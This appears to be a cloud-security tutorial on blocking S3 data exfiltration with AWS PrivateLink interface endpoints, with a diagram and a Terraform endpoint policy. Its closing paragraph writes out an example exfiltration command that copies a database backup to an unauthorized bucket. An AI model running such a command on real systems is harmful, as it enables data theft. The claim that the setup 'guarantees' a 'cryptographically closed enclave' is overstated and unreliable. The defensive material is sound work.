# AWS PrivateLink: Interface Endpoint Security and Blocking Data Exfiltration

## The Problem: NAT Gateways and the Outbound Exfiltration Loophole

To access native AWS services (such as Amazon S3, SQS, or AWS Secrets Manager) from an isolated, private subnet within an AWS VPC, architects historically provisioned an Internet Gateway (IGW) or a NAT Gateway. This configuration routes all API requests bound for `*.amazonaws.com` over the public internet to AWS's public edge interfaces.

While this allows workloads to function, it introduces a severe data loss prevention (DLP) vulnerability:

* **Unrestricted Outbound Access:** A NAT Gateway cannot distinguish between a legitimate API call to a corporate-owned S3 bucket and an illegitimate API call to an anonymous, attacker-controlled S3 bucket.
* **Malware and Command & Control (C2):** If a compute instance in the private subnet is compromised, an attacker can use standard AWS CLI commands to exfiltrate database backups, proprietary code, or keys directly to an external S3 bucket, completely bypassing standard network-layer firewall inspection.

---

## The Solution: AWS PrivateLink and Endpoint Policies

AWS PrivateLink solves this problem by establishing a private connection between your VPC and supported AWS services or third-party SaaS services without traversing the public internet. 

PrivateLink provisions **Interface Endpoints**, which are represented as Elastic Network Interfaces (ENIs) with private IP addresses in your private subnets. These ENIs use AWS Hyperplane (a high-throughput, low-latency distributed state machine) to route traffic entirely within the AWS internal network backbone.

Crucially, because the connection is localized as an ENI, you can attach an **Endpoint Policy** to the Interface Endpoint. This is an IAM resource policy that sits at the network boundary, controlling exactly *who* can use the endpoint and *what* resources they can access. It effectively blocks the exfiltration loophole.

### Secure PrivateLink Data Perimeter Architecture

```
INSECURE: Routing via NAT (Exfiltration Risk)
[ Private Subnet VM ] ===(NAT Gateway)===> [ Public S3 Endpoint ] ===> Attacker's S3 Bucket (OK)
                                                                 ===> Corporate S3 Bucket (OK)

SECURE: PrivateLink + VPC Endpoint Policy (Restricted Perimeter)
+--------------------------------------------------------------+
| Private Subnet (No Internet / NAT Routes)                    |
|  [ Compute VM ]                                              |
+-------|------------------------------------------------------+
        | (Private DNS: s3.us-east-1.amazonaws.com)
        v
+--------------------------------------------------------------+
| VPC S3 Interface Endpoint (ENI with Private IP)              |
|  - Security Group: Port 443 strictly from Subnet             |
|  - Endpoint Policy: Allow S3 actions ONLY to Corporate Buckets|
+-------|------------------------------------------------------+
        |
        |=== (AWS Global Backbone - No Public Internet) ===> Corporate S3 Bucket (ALLOWED)
        |=== (AWS Global Backbone - No Public Internet) ===x Attacker's S3 Bucket (BLOCKED)
```

---

## Technical Configuration: Enforcing S3 Endpoints in Terraform

The Terraform configuration below provisions an AWS S3 Interface VPC Endpoint and attaches a zero-trust Endpoint Policy. This policy enforces a strict data perimeter: it blocks access to any S3 bucket that is not owned by the corporate AWS account and rejects any traffic that does not originate from the organization.

### `privatelink_s3.tf`

```hcl
# privatelink_s3.tf - Hardening the VPC Data Perimeter with PrivateLink S3 Endpoint

resource "aws_security_group" "s3_endpoint_sg" {
  name        = "vpc-s3-endpoint-sg"
  description = "Restrict access to S3 interface endpoint to HTTPS inside VPC"
  vpc_id      = "vpc-0123456789abcdef0"

  ingress {
    description = "Allow HTTPS inbound from private VPC CIDR"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"] # Private VPC address space
  }

  egress {
    description = "Allow all outbound responses"
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_vpc_endpoint" "s3_interface_endpoint" {
  vpc_id            = "vpc-0123456789abcdef0"
  service_name      = "com.amazonaws.us-east-1.s3"
  vpc_endpoint_type = "Interface" # S3 supports both Gateway and Interface types

  subnet_ids = [
    "subnet-0123456789ab11111",
    "subnet-0123456789ab22222"
  ]

  security_group_ids  = [aws_security_group.s3_endpoint_sg.id]
  private_dns_enabled = true # Force standard SDK calls to resolve to the ENIs

  # Strict DLP Endpoint Policy
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid       = "AllowOnlyCorporateBuckets"
        Effect    = "Allow"
        Principal = "*"
        Action = [
          "s3:GetObject",
          "s3:PutObject",
          "s3:ListBucket"
        ]
        Resource = [
          "arn:aws:s3:::corporate-production-data-bucket",
          "arn:aws:s3:::corporate-production-data-bucket/*"
        ]
      },
      {
        Sid       = "DenyExternalBucketAccess"
        Effect    = "Deny"
        Principal = "*"
        Action    = "s3:*"
        Resource  = "*"
        Condition = {
          StringNotEquals = {
            # Deny access to any bucket not belonging to this specific AWS account
            "aws:ResourceAccount" = "123456789012"
          }
        }
      }
    ]
  })

  tags = {
    Environment = "Production"
    Security    = "Data-Perimeter-Enforced"
  }
}
```

This configuration guarantees that even if a compute instance is fully compromised, any attempt to run a command like `aws s3 cp backup.sql s3://some-unauthorized-bucket/` will instantly fail with an `AccessDenied` error at the VPC endpoint level. It turns a standard flat VPC network into a cryptographically closed enclave, eliminating major vectors for cloud-native data exfiltration.
